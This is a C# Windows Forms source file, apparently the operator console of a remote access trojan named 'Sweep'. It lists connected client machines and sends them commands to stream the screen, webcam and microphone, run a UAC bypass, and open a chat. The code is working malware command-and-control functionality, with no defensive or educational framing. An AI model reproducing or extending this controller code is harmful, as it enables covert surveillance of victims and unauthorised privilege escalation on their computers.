using System;
using System.Collections.Generic;
using System.Windows.Forms;
using BrightIdeasSoftware;
using LazyServer;
using Newtonsoft.Json.Linq;
using Sweep.Models;
using Sweep.Services;    // MessageHandler
using Sweep.UI;          // ListViewConfigurator
using Microsoft.VisualBasic;

namespace Sweep.Forms
{
    public partial class Sweep : Form
    {
        private readonly LazyServerHost _server;
        private readonly MessageHandler _dispatcher;
        private int logsnum = 0;

        // Inject the already-started server here
        public Sweep(LazyServerHost server)
        {
            InitializeComponent();

            if (server == null)
                throw new ArgumentNullException(nameof(server));

            _server = server;

            // 1) Configure the ObjectListView once
            ListViewConfigurator.Configure(listView1, Global.Port);

            // 2) Create your central dispatcher
            //    It will subscribe to server events and call your handlers
            _dispatcher = new MessageHandler(_server, listView1, Global.Port, logsview, this);
            logsview.FormatRow += (sender, e) =>
            {
                var log = (Log)e.Model;

                if (log.Type == "Error")
                {
                    e.Item.ForeColor = System.Drawing.Color.Red;
                }
            };
            logsview.SetObjects(new List<Log>());
            logsview.ItemsChanged += (sender, e) => {
                logsnum++;
                counter.Text = logsnum.ToString();
                counter.Visible = logsnum > 0;
            };
        }

        private async void seescreen_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects) {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; };

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    await _server.SendMessageToConnection(conn, new JObject {
                        ["command"] = "ssloop",
                        ["quality"] = "40%"
                    }.ToString());
                }
            }
        }

        private void Sweep_Load(object sender, EventArgs e)
        {
            portnum.Text = portnum.Text.Replace("%s", Global.Port.ToString());
        }

        private async void uACBypassToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; }
                ;

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    await _server.SendMessageToConnection(conn, new JObject
                    {
                        ["command"] = "uacbypass",
                    }.ToString());
                }
            }
        }

        private void home_Click(object sender, EventArgs e)
        {
            listView1.Visible = true;
            logsview.Visible = false;
        }

        private void logs_Click(object sender, EventArgs e)
        {
            listView1.Visible = false;
            logsview.Visible = true;
            logsnum = 0;
            counter.Visible = false;
        }

        private async void webcam_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; }
                ;

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    await _server.SendMessageToConnection(conn, new JObject
                    {
                        ["command"] = "camloop",
                        ["quality"] = "40%",

                    }.ToString());
                }
            }
        }

        private async void microphoneToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; }
                ;

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    await _server.SendMessageToConnection(conn, new JObject
                    {
                        ["command"] = "micloop",

                    }.ToString());
                }
            }
        }

        private async void chatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; }
                ;

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    var input = Interaction.InputBox("Enter display name", "Chat", Global.Name);

                    if (String.IsNullOrEmpty(input)) {
                        return;
                    }

                    await _server.SendMessageToConnection(conn, new JObject
                    {
                        ["command"] = "chat",
                        ["username"] = input,
                    }.ToString());
                }
            }
        }
    }

}
